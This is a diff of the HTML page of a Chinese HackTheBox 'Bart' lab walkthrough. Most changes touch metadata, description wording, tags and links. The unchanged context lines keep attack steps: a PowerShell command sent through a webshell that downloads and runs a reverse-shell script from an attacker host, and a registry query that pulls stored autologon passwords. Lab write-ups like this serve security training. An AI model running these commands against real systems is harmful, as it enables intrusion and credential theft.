@@ -20,12 +20,12 @@
   <title>HTB: Bart - T0x1c</title>
 
   
-    <meta name="description" content="Bart是一个中等难度的靶机，知识点涉及密码爆破、网页信息爬取、javascript代码分析、登陆凭证获取、任意注册等。密码爆破成功后进入系统，通过日志接口完成文件上传，最后抓取自动登陆凭证上线管理员。感兴趣的同学可以在HackTheBox中进行学习。">
+    <meta name="description" content="Bart是一个中等难度的靶机，知识点涉及密码爆破、网页信息爬取、javascript代码分析、登陆凭证获取、任意注册等。密码爆破成功后可进入系统，通过日志接口进行文件上传，在注册表中获取自动登陆凭证完成管理员上线。感兴趣的同学可以在HackTheBox中进行学习。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HTB: Bart">
 <meta property="og:url" content="https://toxic80l.github.io/post/d7f2b8e2/index.html">
 <meta property="og:site_name" content="T0x1c">
-<meta property="og:description" content="Bart是一个中等难度的靶机，知识点涉及密码爆破、网页信息爬取、javascript代码分析、登陆凭证获取、任意注册等。密码爆破成功后进入系统，通过日志接口完成文件上传，最后抓取自动登陆凭证上线管理员。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:description" content="Bart是一个中等难度的靶机，知识点涉及密码爆破、网页信息爬取、javascript代码分析、登陆凭证获取、任意注册等。密码爆破成功后可进入系统，通过日志接口进行文件上传，在注册表中获取自动登陆凭证完成管理员上线。感兴趣的同学可以在HackTheBox中进行学习。">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0200.gif">
 <meta property="og:image" content="https://toxic80l.github.io/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8A%E5%8D%882.38.50.png">
@@ -72,11 +72,13 @@
 <meta property="og:image" content="https://toxic80l.github.io/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%885.30.28.png">
 <meta property="og:image" content="https://toxic80l.github.io/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%886.26.52.png">
 <meta property="article:published_time" content="2022-02-07T01:46:43.000Z">
-<meta property="article:modified_time" content="2022-02-07T04:45:07.505Z">
+<meta property="article:modified_time" content="2022-02-08T02:26:10.441Z">
 <meta property="article:author" content="toxic80L">
 <meta property="article:tag" content="靶机">
+<meta property="article:tag" content="文件上传">
 <meta property="article:tag" content="javascript">
 <meta property="article:tag" content="登陆凭证">
+<meta property="article:tag" content="密码爆破">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0200.gif">
   
@@ -129,13 +131,13 @@
 
 <article class='content md post'>
 <h1 class="article-title"><span>HTB: Bart</span></h1>
-<p>Bart是一个中等难度的靶机，知识点涉及密码爆破、网页信息爬取、javascript代码分析、登陆凭证获取、任意注册等。密码爆破成功后进入系统，通过日志接口完成文件上传，最后抓取自动登陆凭证上线管理员。感兴趣的同学可以在HackTheBox中进行学习。</p>
+<p>Bart是一个中等难度的靶机，知识点涉及密码爆破、网页信息爬取、javascript代码分析、登陆凭证获取、任意注册等。密码爆破成功后可进入系统，通过日志接口进行文件上传，在注册表中获取自动登陆凭证完成管理员上线。感兴趣的同学可以在HackTheBox中进行学习。</p>
 <span id="more"></span>
 <span class="tag-plugin emoji"><img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0200.gif" style="height:3em" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></span>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8A%E5%8D%882.38.50.png" alt="截屏2021-10-21 上午2.38.50"></p>
 <h2 id="0x01-侦查"><a href="#0x01-侦查" class="headerlink" title="0x01 侦查"></a>0x01 侦查</h2><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p>首先通过nmap对目标进行端口扫描</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -p- -sV -sC -A 10.10.10.81 -oA nmap_Bart</span><br></pre></td></tr></table></figure>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8A%E5%8D%882.52.33.png" alt="截屏2021-10-21 上午2.52.33"><br>扫描结果发现目标开放了80端口</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8A%E5%8D%882.52.33.png" alt="截屏2021-10-21 上午2.52.33"><br>扫描结果显示目标开放了80端口</p>
 <h4 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h4><p>无法访问<code>http://10.10.10.81</code>，需要修改 hosts 文件以改用域名进行访问</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line"><span class="comment">##配置</span></span><br><span class="line">10.10.10.81 forum.bart.htb bart.htb</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8A%E5%8D%883.15.06.png" alt="截屏2021-10-21 上午3.15.06"><br>开始使用 gobuster 进行目录扫描</p>
@@ -158,27 +160,27 @@
 </thead>
 <tbody><tr>
 <td>Samantha Brown</td>
-<td><a href="mailto:&#x73;&#x2e;&#x62;&#114;&#111;&#x77;&#x6e;&#x40;&#98;&#x61;&#x72;&#116;&#46;&#x6c;&#111;&#99;&#97;&#x6c;">&#x73;&#x2e;&#x62;&#114;&#111;&#x77;&#x6e;&#x40;&#98;&#x61;&#x72;&#116;&#46;&#x6c;&#111;&#99;&#97;&#x6c;</a></td>
+<td><a href="mailto:&#115;&#46;&#x62;&#x72;&#111;&#119;&#110;&#64;&#x62;&#97;&#x72;&#x74;&#x2e;&#108;&#x6f;&#x63;&#97;&#108;">&#115;&#46;&#x62;&#x72;&#111;&#119;&#110;&#64;&#x62;&#97;&#x72;&#x74;&#x2e;&#108;&#x6f;&#x63;&#97;&#108;</a></td>
 <td>CEO@BART</td>
 </tr>
 <tr>
 <td>Daniel Simmons</td>
-<td><a href="mailto:&#100;&#46;&#115;&#x69;&#109;&#109;&#x6f;&#110;&#x73;&#64;&#98;&#x61;&#114;&#x74;&#46;&#x68;&#116;&#x62;">&#100;&#46;&#115;&#x69;&#109;&#109;&#x6f;&#110;&#x73;&#64;&#98;&#x61;&#114;&#x74;&#46;&#x68;&#116;&#x62;</a></td>
+<td><a href="mailto:&#x64;&#x2e;&#115;&#105;&#109;&#x6d;&#x6f;&#110;&#115;&#64;&#98;&#x61;&#114;&#116;&#46;&#104;&#116;&#x62;">&#x64;&#x2e;&#115;&#105;&#109;&#x6d;&#x6f;&#110;&#115;&#64;&#98;&#x61;&#114;&#116;&#46;&#104;&#116;&#x62;</a></td>
 <td>Head of Sales</td>
 </tr>
 <tr>
 <td>Robert Hilton</td>
-<td><a href="mailto:&#114;&#46;&#x68;&#x69;&#x6c;&#116;&#111;&#x6e;&#64;&#x62;&#x61;&#114;&#116;&#46;&#104;&#x74;&#x62;">&#114;&#46;&#x68;&#x69;&#x6c;&#116;&#111;&#x6e;&#64;&#x62;&#x61;&#114;&#116;&#46;&#104;&#x74;&#x62;</a></td>
+<td><a href="mailto:&#x72;&#46;&#104;&#x69;&#108;&#116;&#x6f;&#x6e;&#64;&#x62;&#97;&#114;&#x74;&#46;&#104;&#x74;&#x62;">&#x72;&#46;&#104;&#x69;&#108;&#116;&#x6f;&#x6e;&#64;&#x62;&#97;&#114;&#x74;&#46;&#104;&#x74;&#x62;</a></td>
 <td>Head of IT</td>
 </tr>
 <tr>
 <td>Harvey Potter</td>
-<td><a href="mailto:&#x68;&#46;&#112;&#x6f;&#116;&#116;&#101;&#114;&#64;&#x62;&#x61;&#x72;&#x74;&#x2e;&#x68;&#x74;&#98;">&#x68;&#46;&#112;&#x6f;&#116;&#116;&#101;&#114;&#64;&#x62;&#x61;&#x72;&#x74;&#x2e;&#x68;&#x74;&#98;</a></td>
+<td><a href="mailto:&#x68;&#x2e;&#x70;&#111;&#x74;&#x74;&#101;&#114;&#x40;&#98;&#97;&#x72;&#x74;&#46;&#104;&#116;&#98;">&#x68;&#x2e;&#x70;&#111;&#x74;&#x74;&#101;&#114;&#x40;&#98;&#97;&#x72;&#x74;&#46;&#104;&#116;&#98;</a></td>
 <td>Developer@BART</td>
 </tr>
 <tr>
 <td>Daniella Lamborghini</td>
-<td><a href="mailto:&#x64;&#46;&#108;&#x61;&#109;&#x62;&#111;&#x72;&#x67;&#104;&#105;&#110;&#x69;&#x40;&#98;&#x61;&#114;&#116;&#46;&#104;&#116;&#98;">&#x64;&#46;&#108;&#x61;&#109;&#x62;&#111;&#x72;&#x67;&#104;&#105;&#110;&#x69;&#x40;&#98;&#x61;&#114;&#116;&#46;&#104;&#116;&#98;</a> (guess?)</td>
+<td><a href="mailto:&#100;&#x2e;&#108;&#97;&#109;&#x62;&#111;&#114;&#103;&#104;&#x69;&#110;&#x69;&#64;&#98;&#97;&#114;&#116;&#46;&#x68;&#116;&#x62;">&#100;&#x2e;&#108;&#97;&#109;&#x62;&#111;&#114;&#103;&#104;&#x69;&#110;&#x69;&#64;&#98;&#97;&#114;&#116;&#46;&#x68;&#116;&#x62;</a> (guess?)</td>
 <td>Head of Recruitment</td>
 </tr>
 </tbody></table>
@@ -214,7 +216,7 @@
 <p>在 webshell 中执行如下命令</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=powershell -c iex(new-object net.webclient).downloadstring(<span class="string">&#x27;http://10.10.14.3/Invoke-PowerShellTcp.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>
 <p>成功反弹shell<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%884.17.27.png" alt="截屏2021-10-21 下午4.17.27"></p>
-<h2 id="0x03-上线-administrator"><a href="#0x03-上线-administrator" class="headerlink" title="0x03 上线[administrator]"></a>0x03 上线[administrator]</h2><p>权限提升可参考：<strong><a target="_blank" rel="noopener" href="https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/">https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a></strong></p>
+<h2 id="0x03-上线-administrator"><a href="#0x03-上线-administrator" class="headerlink" title="0x03 上线[administrator]"></a>0x03 上线[administrator]</h2><p><strong>参考文章：<a target="_blank" rel="noopener" href="https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/">https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a></strong></p>
 <h3 id="登陆凭证获取"><a href="#登陆凭证获取" class="headerlink" title="登陆凭证获取"></a>登陆凭证获取</h3><p>执行以下命令以便在注册表中发现自动登录的默认凭据存储</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span> 2&gt;nul | findstr <span class="string">&quot;DefaultUserName DefaultDomainName DefaultPassword&quot;</span></span><br></pre></td></tr></table></figure>
 <p>但是以上命令是cmd下执行的，而目前所处环境为powershell，需执行以下命令</p>
@@ -254,7 +256,7 @@
 
 </article>
 
-<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/ce0b23f8/">HTB: Tally<span class="note">Older</span></a><div class="line"></div></section></div>
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/ce0b23f8/">HTB: Tally<span class="note">Older</span></a><div class="line"></div><a id="prev" href="/post/61576a4b/">HTB: Active<span class="note">Newer</span></a></section></div>
 
 
 
